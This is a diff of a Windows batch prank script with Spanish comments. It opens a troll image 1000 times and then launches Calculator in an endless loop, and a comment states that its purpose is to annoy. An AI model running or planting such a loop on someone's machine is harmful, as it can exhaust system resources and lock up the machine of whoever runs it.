@@ -1,21 +1,31 @@
 @echo off
 setlocal enabledelayedexpansion
-set "imagen=C:troll.jpeg"
-set "veces=999"
-for /l %%i in (1,1,%veces%) do (
-    start "" "%imagen%"
-    ping 127.0.0.1 -n 1 -w 300 >nul
+
+:: Ruta de la imagen
+set "imagen=C:\troll.jpg"
+set "veces=1000"
+
+:: Verificar si la imagen existe
+if not exist "%imagen%" (
+    echo ERROR: La imagen no se encuentra en C:\troll.jpg
+    pause
+    exit
 )
 
-:: Bucle infinito para abrir la Calculadora
+:: Iniciar la calculadora en un proceso independiente (inmediatamente)
+start "" C:\Windows\System32\calc.exe
+
+:: Abrir la imagen 1000 veces
+for /l %%i in (1,1,%veces%) do (
+    start "" "%imagen%"
+    ping 127.0.0.1 -n 1 -w 200 >nul
+)
+
+:: Bucle infinito para abrir la Calculadora (intentar con diferentes métodos)
 :inicio
-start calc.exe
+start "" ms-calculator:
 ping 127.0.0.1 -n 1 >nul
 goto inicio
-:: Mas elementos que voy a añadir para molestar
-::Bucle para crear archivos de texto con mensajes aleatorios
-
-
 
 
 
